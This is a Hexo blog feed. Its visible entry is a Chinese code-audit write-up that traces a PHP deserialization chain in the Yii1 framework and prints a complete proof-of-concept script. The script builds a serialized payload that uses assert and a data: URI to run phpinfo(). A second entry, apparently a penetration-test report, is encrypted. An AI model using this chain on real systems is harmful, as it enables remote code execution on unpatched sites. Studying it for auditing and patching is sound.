<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-09T09:36:37.715Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>yii1和yii2反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/10/09/yii1%E5%92%8Cyii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/10/09/yii1%E5%92%8Cyii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-10-08T16:00:00.000Z</published>
    <updated>2020-10-09T09:36:37.715Z</updated>
    
    <content type="html"><![CDATA[<h4 id="yii1反序列化"><a href="#yii1反序列化" class="headerlink" title="yii1反序列化"></a><strong>yii1反序列化</strong></h4><p>在yii1中，反序列化的入口点在__wakeup魔术方法，在文件\framework\db\schema\CDbCriteria.php</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/8/1.png" width="900" height="600" loading="lazy"></div><p>这里$this-&gt;params是可控的，继续看\framework\collections\CMapIterator.php这个类，这里利用了接口Iterator，关于这个接口的详细使用可以查看：<a href="https://blog.csdn.net/wuxing26jiayou/article/details/50977462" target="_blank" rel="noopener">https://blog.csdn.net/wuxing26jiayou/article/details/50977462</a> ，所以会调用到current方法，而这里$this-&gt;_d和$this-&gt;_key都是可控的</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/8/2.png" width="900" height="600" loading="lazy"></div><p>而php另外一个接口<a href="https://www.cnblogs.com/zyf-zhaoyafei/p/5228652.html" target="_blank" rel="noopener">ArrayAccess</a>返回实例化对象的数组形式，会直接调用offsetGet方法，在文件\framework\caching\CCache.php中，使用了这个接口</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进get方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">generateUniqueKey</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token boolean">false</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">serializer</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//echo 11;exit;</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">serializer</span><span class="token operator">===</span><span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">serializer</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">ICacheDependency</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getHasChanged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        Yii<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">'Serving "'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'" from cache'</span><span class="token punctuation">,</span><span class="token string">'system.caching.'</span><span class="token punctuation">.</span><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里使用了call_user_func函数执行代码，$this-&gt;serializer是可控的，这里只需要满足$value可控就可以执行任意代码，跟进generateUniqueKey方法查看</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">generateUniqueKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hashKey</span> <span class="token operator">?</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keyPrefix</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keyPrefix</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;hashKey和$this-&gt;keyPrefix是可控的，所以这个方法不重要，继续查看getValue方法：\framework\caching\CFileCache.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$cacheFile</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheFile</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// key = 0</span>    <span class="token comment" spellcheck="true">//echo $this->filemtime($cacheFile);exit;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">embedExpiry</span> <span class="token operator">?</span> <span class="token number">10</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$time</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//echo 111;</span>        <span class="token comment" spellcheck="true">//exit;</span>        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个方法主要是读取文件的内容并返回，继续跟进getCacheFile方法，看$cacheFile是否可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getCacheFile</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">directoryLevel</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$base</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cachePath</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token markup">&lt;$this-></span>directoryLevel<span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean">false</span><span class="token punctuation">)</span>                <span class="token variable">$base</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">.</span><span class="token variable">$prefix</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$base</span><span class="token punctuation">.</span><span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cacheFileSuffix</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cachePath</span><span class="token punctuation">.</span><span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cacheFileSuffix</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$this-&gt;directoryLevel和cachePath、cacheFileSuffix可控，DIRECTORY_SEPARATOR常量为反斜杠，所以在getValue方法中$cacheFile是可控的，由于有个<code>\0</code>目录存在，可以利用data协议来获取value的值。exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">CMapIterator</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$_d</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_keys</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_key</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$_d</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_d</span> <span class="token operator">=</span> <span class="token variable">$_d</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CDbCriteria</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CFileCache</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$keyPrefix</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$hashKey</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$serializer</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cachePath</span> <span class="token operator">=</span> <span class="token string">'data:text/'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$directoryLevel</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$embedExpiry</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cacheFileSuffix</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">serializer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'assert'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cacheFileSuffix</span> <span class="token operator">=</span> <span class="token string">';base64,'</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'9999999999phpinfo()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>CFileCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>CMapIterator</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>CDbCriteria</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/8/3.png" width="900" height="500" loading="lazy"></div><h4 id="yii2反序列化"><a href="#yii2反序列化" class="headerlink" title="yii2反序列化"></a><strong>yii2反序列化</strong></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;yii1反序列化&quot;&gt;&lt;a href=&quot;#yii1反序列化&quot; class=&quot;headerlink&quot; title=&quot;yii1反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;yii1反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在yii1中，反序列化的入口点在__wakeup魔术方法，
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>记一次有趣的裸聊渗透测试</title>
    <link href="http://yoursite.com/2020/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E8%A3%B8%E8%81%8A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2020/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E8%A3%B8%E8%81%8A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2020-09-15T16:00:00.000Z</published>
    <updated>2020-09-18T08:43:17.649Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8c2a042426f8a8f825199b728b82f40e4265fee3fcddab320869687387fc4fa3">f74d54f55e9ea325d09d0c0006475ea3ff218d503be0a78f0a9bd5a379144fe55328f435cb11acff7fc50d2a3d4bd2be7465844628c2d8fcde748fb2062706cd443f528400444d8baf9639db9408e05ed5e01274e76332eb844a3e609c6f9b8eb17995584518e3407e18c59c4f2d82bb314e2f7dbf9346ad6c18cdab66c00b3da155e310c69e7ae688bdef6acdda2937242e49151499a2876c4466a0d310ec11891ebc40fe4f8d928cffd5b48b852e4d1611411ebd1d0d7e5c71d1adab9afe2613f7f079f7eb3dff2081b417fb8a13fa726e93dd2f5373d23e5e5295731f35dea95ce801aa3a50e476f9c8d2dcc1d66f09874bc00485308c4c72874cd9e2824701b2dcd8265e85df689c6114822df5ddb4e6fe644daf10d4c6554f21b78a49c5589c17e6940f8d9f8f8ecd2a2224660f12513200dbf3724490ea516714ffd0b3526d85a468b7b27e6885036c983d55f83dc9c247c44a80a5c48e856cfc1d078df9795a3d516bd148c25be84c6e15ac92e356bbe2815eadf6a4f8230bd2ff9e6245b8c4b465f2c9a9303527dcedd681919a66f3054432c6ae74130b35a3282e3d96d137a2581b2576dfec0295a19c4c9209a130d6641399e15ef8b14bf4cc7e839f369f32f88885443ed98712f96c2fb883057046a5d1bb9a8f5c17684e7cae5bb8055ee2d83cfad256c1d7e12887849dc4e3e4f8aa531cf39124238f1cc47c84ba3a9ce742c970ee3000cab2219b9ea3865d2dc8a0258ffe98728117ed16c548d3be9b4f497ffcc917aaa241ca1b147f6cd7aa8f782ed2c9583736a7f848571619fc0838b34a968f16e5bf592277a6594a96144a1d60b865726dbbe94f1f8839963b8b5875639d63ea90798971ac8466f980cc890de6d979972843b621c7f4cde33c4df4016db7a0e2b3e91ad43cdd027c1bfe8850d8edeb5ce318752a4cf816eaa7e408a4b5b73dc8efa7d6e405f35ee71bee3dfafd63c8c4292bd5c1354265848c36916bf08dfca600dd602a77f05be2db116664fc801efcb411200478188f178683a401d1556e92ac56330da144d3eaa270523dc05d64976d986af81e89d897ac8254e494a260f1e6e1bdea2bcd0b1ff6d46d0ac009fc6497da93650299191d7252c56116c15e110f99898cdf80ecb5a8593d176cfb34b1967ce936cf218337d824567208349f67b8d7efad2a050d34eebbe8e42196e9fe55bd8b0f3bbfc773db6a31dcfd48cee6bf7fcbb4ffd2ebf379ffcd766fbf5085b5051992cde4fd2a214574b217526484a81f0d495d959b9240fe9f52de54a4633946b6f0a86e8332d61132a10e5491ee09528ed3137673f605df568e40f0b0730cf0b205ca76e42d4847ca57fd8f4bdf670cf9a34dfe0cb89633ad8dde9783177e5e0dffe82ee61e0e98e9ddc9279606b681d2433c484ec80eade74cda984cbc78acbff628c72e5bd3bdb8af8cac5d653928521b6aa728a3e838dd1adadf8095f55bd0c3da5854936a9ee78b30b667ef7e546f2f1a2e63acc052687d8323c885605c7a324bb6495dd0f9262b1e987563f8f4fd95ae35391c34cc653aeff14b1d02134e66adaffc3f2923887d1c887f4807832bf575ed62f501aa0d4c2f395654894a5d9ebf0e064de944ce09998e9f3964ed3d4704cf79dbea1f1ef17896ae44044a789896cf4d5e9277ac740e57b3bc1585248f1f5457c9a9dc6f57a8d3b9dcb4e6df106d9efdc0f890ee4d4dbeab0b1f7f834271fd00663777dbed52d7da73b324af595762184d765482965045b8a0d0690b0f268a8045d7d60649bc65ac8b7047a30001236c3492f3ce86f73656a7b1ddff5d97e2c7d20936c1f03bbd391ba83140af55ec37135787d4bff6a96198c7160c975395eba3a37b9b73cd252f1aec3026c6a4a09a0b2621827b82e05671199631177cc227d3ed0eef34d13d528d089f9b6ece546f133e3ddc0a0cb1d1c177c38b8dc8228812a02441a47218a4a2ef82291007c93b22af85c2f9b1cf745267a5df0eb6418ff01ec136a05edfd37d0ff750565b7cb63944616fad53d53b475e4b3a7d263f3837ab37f903b37b3e70700a78a87f70beeb9061e17b8f09d2b848c58b51a919d684801992578262a1b4b8f97ed686d2b9b82504f80a10394614360c464255eda6b4a27a7074ca78b932b09f1118cb0cb3990144683661139bbbe917b10f819864bef7c8aa3d9ae4713b55ceecceacb20fab7c2076bb4da87749cf8da81f9fe64a284f11372c9f345c054b2d3f8be17f31c5511eeb5fa6ba148865a5c0145091f394862501621c9b32645c680432b101387d2f262117b1ebcd1d64ec0fc23c5014ca00dca2cff6db5b07e0ad1a04a668ad5bc48323833617711f19159a1eba30936a4641a6d53bbc94a74960dd0db409f945d596fbc27333f31e6ecf7b1e173d8b00fdf723d17840c25bccc81d6700262d70a78b791d29180a543ed5d01fa431cd51cad21c007fcca541d823e658c22af978695fd5473b24cb71e0497d528fd8fda370ac54c8308d2629ccbd0c98e58c6207e5a6d85ee281971fa403b29b201333f1a1f3f09dee4a78f536f08298f25238f1a53653042d5c06e22bc146f19676194cce4506d1739fd4668deceabee26d251904a552a8d18e6f17d32db52226473ef6433bbbe60d42a49fb8bb41b5cc06b2a0d7ce653e844562356c011d5c980ec8136ebbbfe5cb6944dcdb8f2f44e6c16b576ad8092659d4e285f05e8facf39d1fbfa7e16a86765a6123d496153c89a403cc5a27e25d2efa255f0d279e2950be70828222d5ec57c717352280cb3c6cc282ffbc520e0c1b673a4293f650bf29c0e22ff8b0094bb1b7e19a8fac5f77b5e8e5f7a5d108df41503d3e3074f65549594ac301c7723e565d7f8c2193d7fab5b27f8b36fb81cdd5a132b43b63799496d6fc9f72d3e4e79f3f1f1b69ca71c7c19d48283599af8bc56f9d18dd88337e25b3698ad35135cf165be378addfe053deef1c01bcf81e3b7fbea799cb650a3197aed6eeb99e2ac9080229ea34b1efea4ee71e24ee28f9e8492c3498e326e0aa38b954fb502bdb4ef41766e91c3f2f118545b9b40b498e0c5d2e514b799092fe6f47b56fc718efd969bcc6eca752fbc1878514cb961f3b1a932c1eccafb40637410fe61a05d26e3405626d29cf3c47ec559912eeea27e7781d1e6d371f5b5e8c75c1acb1c1a6e110e0bcd4a4c4581c25ec47f484e47fceaf33bedc341be7b1ccad278b8df7f65a922ef02043053d646e2903548908d3e3f3c3efcceb1746e4a7947604e763bbc1dc9273d983e2fdfb8aea6254665c82e0ef80bfa8d45a5c40c64f62d80805baba84760c05573c24f844dd6da4fe3309afa13addb33f849339fd733f284d825944ffd35490ce848e1826d7db96719103f11f9d9cf46adc6d2c62870cc69a0afde3fe537fabc956abfba2a86a6679a80a5b9217fde383bc7519e000e919e78f1850dedfd51ad44c2e715b7288f2259a496d6e9b2d5d0814d28a2fd026f0972ff888f5e0d62a4817962a1190cffc710d3eeadfff5b20a7b7778e2ada9c96d95c5531ec2d00b65769c9298ba64b3f49868418159114780206ef6242e48d5e5f948471c039586c89b3528c39b04a432d1528b725eaddcfc831bc7cab07d4844c5f868788d3061012ed0e45d2907c71347f9e15ad636e1a50e6e12d3fffcf3e9b880cfd73f7b1a4cd9a965222b832d16f9dbe0e3e9986173aec1ea6a01bb7ab2333659e01600c2d8703532dddfd80f9b5aee01840c3678dceabbad67ffd1ff13e4c9ad661bcab608b6e07e98d0494997b365949cb6a4d0897a7304cb91f4bdcb6ca673fe0a750b0d717eb5cb56668e9d650e29f27a4c8ef40ecce515200c9111860f02a8c3373536e85fae5b4b9dece500bdebe073963cbecdaa2a8f4125d851197c7f031b8b6f0c147b307cfd25836dc5ae25fe6b4513f4e7626db2516668c2e528b3b30fd174eb7a19b575edfd63e915c417172881d234ead35df272193c14bf2147deb73f35780aadd93d4613403e1e3a89e28acb5c922389c436463cf5280420808837f548b79fdb25704dbd9315b6188830d4575a5f15cbbf00cd14b95be877097e726cbacebeac87a6dedfee102a6cae97e75e210a2bf5bfdad6b57f130d5bdc435f497ed7d5245851173f4bcab356461b579f37a547c3fe9236f95072bcb7a7f1f3b6ed00f21b2a9cac6cdfefcd515717a622fa49948a58a052badb4855fc22355f06e4f87765e93d24427e631aa119474e1c4e8dd601cd34f031d65f0e9143810aa44b253dd848636043706b3aee7d85dea07b4f388c2ec4a981efcb2a77cbe88e3765b9c27ee7df9b68c06cbea48a988a909315969909395187adbb28d09b709d84990e639f11b1ec3a5fba0f463c715b5e9f5b7c25336a054175f0dc8ef70fc937db2189fa1413149d9a41c85dcbd7ef7c176c6982a1b611313aade3f2a33f3753fabc848827e322e91c898e91bf71d161b29222d0feb7015c2f1422caa63887d2985d0752fcbbc963440628af8df2464b21d05fe21a6a567685d3ee40dfe7d506a22ff8d7e1f1359d89b8dd72e834b21cf2c2376ad08dda6158088975e79be944059360b60a000a1d1cfbc14405db37ba521f60dd3d71290b2c4a55a30b511ea25f56c00ef2eb60d1a0ec62bcbfe7f8f43f6c2a89911f42fbda048c5801df00ac0c0bb94b8ed79fdfc7497d18dcd48e46f4151360cb6886611ec9743f0d1e821e6f5fe634977a682dd58c24e9b4e23c07b13db010ee86b6891cce5e7e704ca052e15cab37b04016b8c71b75788abe88168302734caa9414796f7c25cd943c5ac0a5b03b3bec862cfe70aa26f42858dc7797c4f92aa91d18ea38b68bd945f37974733002064bfeb7f091241cedaac2acc2fb23d4bfa541c190256588b7221d51d08fd4bc6f9fdcffe68f049d7e6eaddb2b201539cc4efbbfb9f6f5dd1b09f2483db3380a958cb685489acd4589c866b23f954c24914da24f607549e6c6b4de8ef837b10301200998872cf11fe3b6574c20de315301846afa0384f83028a8fdf0085273e4c8d06cb875d6eb64341aecdd4f569e2bd0aa62d9151c904b0aaa3f54b40013346e366d9e6557361d43fcd8530524ae45d699557b7e0aef177a41fd2f64334723d575f937f296f8f1ec1ff9163fe35ef078ee9ecbed15be1aac498fce91e17eb33f258b5140977e403a10941a492c2082e27f102f1dcd0fdfd26d7e5507f1d66c25718779c978b5c59fd2efb9060f6777bdc55cf5b294630f1c9dd638064caf55ab5ec2833fd3cfbdbdf358c68f23ff633dfc5397fd88b1b85c1589f37f73e9ebf92dba4c5a95e283650e7df5d7918fd5059c311c8046bac16adfd9967c5ea23d1edb9c0a61ae54c215cf14d859b73063b58dff89fefea172d75ac86b963bea1e8b4651b34c69e8fd9ca7b3fa05a2697ff6c860f3ad38de6a18aebd11e3ede5826d42aaad63498719e06a34b4aacd6e5212322dbb545f73b4e0954aaa23cd4861892c92e63aac4c0a2e2c7abf09e275fc7d4943beadacca3180ba4593623586c2abdcd202627f2a07dc4ea64dc17e64472d301f0434370e3c65c14f03e5dfef4fbd7e2720d05356eb52968fe7eebdded0646f2652f0de2e7f92370d6b7bbd7610fac359c7fe06c82b2000d85df7c09684234860a71dec94f3d95af3bfe6f2cac96e2d293b3c748f4f85cbae5dee9fe34eca58fc82bcc42d4e1fc9bf4a63e52420df4a0314590a5b3180704c9290480573802961f34f6bfaabb73a0bd0e9029279f35a1f909c2037e20ad3676ad96be34219a7d7e6b51597c9cf776eaab8d83d6b2a355be675bf2fefdef96ad64faeedd5a3fb3dd62d8be7d593a326bdcbf24dda21a8470458ccb3fecddd282b83e860c26e266eeae61dbdcd2b2caa4f481bbb56e35d1a902542e29379337a49203ab80531ca22175316860e9f0ae0dc0c7f2c1f7e596f440fe0cda86664ddd3e7d0887611715fa729d050bf44098a8f01904ebe965e89a8f1a6a936210707c2f7c9a5088b7e62236d585ab56f7c06a74f720e9c6cf8072a9d3f4b7a178e6acbb39353f0fe8cbb51eae5fa512614f87d492d8bb6843b9bf5c9433f3b51fd8c2fcc3077074210ec3c201aff51156b47c711957304e37da81c0bdb40f1fc4fe4c2ba6bb1ab7ab30f22d94d52ed103a8773b55e1dfb783c32a08a751621d1b0967014ac39dfb5730c9ec7fb66154ff7f608bc3d128deec4d15ea54182b87d750441158f0097e6ee77da7bd2d0fa243fc3cfa74186a2d1ba8d4378cb45d496e62fbd081fdcea6d35fe48c0dd428208621ae8eec414da801b9c6a7b3fa2052d58078430335ded8f80ce519c963ee2cd4fe3364850a